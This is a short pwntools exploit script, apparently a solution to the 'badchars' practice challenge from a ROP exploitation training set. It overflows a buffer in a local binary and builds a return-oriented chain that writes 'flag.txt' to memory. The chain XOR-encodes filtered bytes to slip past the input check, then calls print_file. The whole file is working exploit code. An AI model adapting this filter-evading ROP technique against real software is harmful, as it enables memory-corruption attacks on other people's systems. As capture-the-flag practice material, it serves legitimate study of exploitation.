#!/usr/bin/python3

from pwn import *

PROG_NAME = "./badchars"

p = process(PROG_NAME)
elf = p.elf
rop = ROP(elf)

if args.ATTACH:
    gdb.attach(p, '''break main''')
    sleep(5)

bad_bytes = b'xga.'
# this XOR will just capitalise essentially
bitmask = 1 << 5

data_addr = 0x0000000000601028
mov_ptr_r13_r12_addr = 0x0000000000400634       # mov qword ptr [r13], r12; ret;
pop_r12_r13_r14_r15_addr = 0x000000000040069c   # pop r12; pop r13; pop r14; pop r15; ret;
xor_ptr_r15_r14_addr = 0x0000000000400628       # xor byte ptr [r15], r14b; ret;
pop_r15_addr = 0x00000000004006a2               # pop r15; ret;
pop_rdi_addr = 0x00000000004006a3               # pop rdi; ret;
p.recvuntil(b'> ')

payload = b'A' * (0x20 + 0x8)

for i, string in enumerate([b'flag.txt', b'\x00'*8]):
    # build our string, 8 bytes at a time

    payload += p64(pop_r12_r13_r14_r15_addr)

    # xor badchars to bypass badchars check
    # if we don't limit xor to badchars,
    # we actually exceed an 0x200 byte payload
    for c in string:
        if c in bad_bytes:
            payload += p8(c ^ bitmask)
        else:
            payload += p8(c)

    payload += p64(data_addr + i*8)
    payload += p64(bitmask)
    payload += b'AAAAAAAA'
    payload += p64(mov_ptr_r13_r12_addr)

    for j in range(8):
        if string[j] in bad_bytes:
            # in-memory data manipulation to undo xor
            payload += p64(pop_r15_addr)
            payload += p64(data_addr + i*8 + j)
            payload += p64(xor_ptr_r15_r14_addr)


# with our .data set up, we can call print_file
payload += p64(pop_rdi_addr)
payload += p64(data_addr)
payload += p64(elf.symbols['print_file'])

p.sendline(payload)

p.interactive()
